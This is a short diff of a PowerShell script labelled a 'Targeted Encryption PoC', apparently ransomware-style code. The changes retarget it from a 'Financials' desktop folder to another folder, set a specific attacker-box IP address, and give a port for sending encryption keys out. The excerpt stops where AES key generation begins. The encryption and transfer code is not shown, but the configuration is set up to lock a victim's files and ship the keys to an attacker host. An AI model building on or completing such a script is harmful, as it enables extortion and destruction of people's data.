@@ -1,8 +1,8 @@
 # --- 03.CRYP7L4D Targeted Encryption PoC ---
 
-$TargetFolder = "$home\Desktop\Financials"
-$AttackBoxIP = "192.168.1.X"
-$Port = "4445" # Use a different port for keys
+$TargetFolder = "$home\Desktop\PROJECT.5527"
+$AttackBoxIP = "192.168.1.16"
+$Port = "4434" # Use a different port for keys
 
 if (Test-Path $TargetFolder) {
     # 1. Generate AES Key and IV
